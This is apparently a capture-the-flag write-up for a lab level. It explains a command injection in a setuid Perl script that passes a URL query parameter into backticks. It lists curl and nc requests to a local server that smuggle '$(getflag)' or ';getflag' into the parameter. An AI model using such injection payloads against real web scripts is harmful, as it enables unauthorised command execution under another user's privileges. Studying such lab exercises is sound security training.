## level04

From the `level04.pl` we can understand, that some server is running inside the system. <br>
We can ensure that with this command:
```bash
netstat -tulpn
```

The next thing we should notice is that \` is used in the script:
```pl
...
print `echo $y 2>&1`;
...
```
All that passed inside a \` will be executed (like `system()`). <br>

From the script permissions we can notice, that script will be running from flag04 user:
```
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

We need to pass getflag binary and use `$(getflag)` form to make it work inside the `echo` call.<br>
Or use `; getflag` to make their execution separately. <br>

The script is receiving the argument from the query string that URL-encoded, so [this site](https://www.urlencoder.org/) will be useful. 

Here's the list of some solutions:
```bash

# 1) As simple as that
curl http://localhost:4747?x=%24%28getflag%29

# 2) Or with nc
echo -e "GET /?x=%24%28getflag%29 HTTP/1.1\nHost:localhost\n\n" | nc localhost 4747

# 3) Without encoding
echo -e 'GET /?x=$(getflag) HTTP/1.1\nHost:localhost\n\n' | nc localhost 4747

# 4) Using separation
curl http://localhost:4747?x=%3Bgetflag

```